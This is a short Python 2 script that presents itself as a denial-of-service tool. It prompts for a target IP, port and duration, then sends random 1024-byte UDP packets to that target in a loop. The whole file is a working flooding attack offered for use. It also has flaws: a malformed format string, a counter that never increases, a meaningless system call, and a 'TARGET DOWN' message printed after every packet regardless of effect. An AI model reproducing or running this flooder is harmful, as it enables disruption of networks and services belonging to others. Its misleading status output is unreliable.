import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("=========== Clear =========")
print("Welcome to DoS")
print("")
ip = raw_input("Target ip: ")
port = input("Port: ")
dur = input("Time: ")
timeout = time.time() + dur
sent = 0

while True:
	try:
		if time.time() > timeout:
			break
		else:
			pass
		sock.sendto(bytes,(ip, port))
		print("Sent %S packets to %s through port")
		print("TARGET DOWN")
	except KeyboardInterrupt:
		sys.exit()
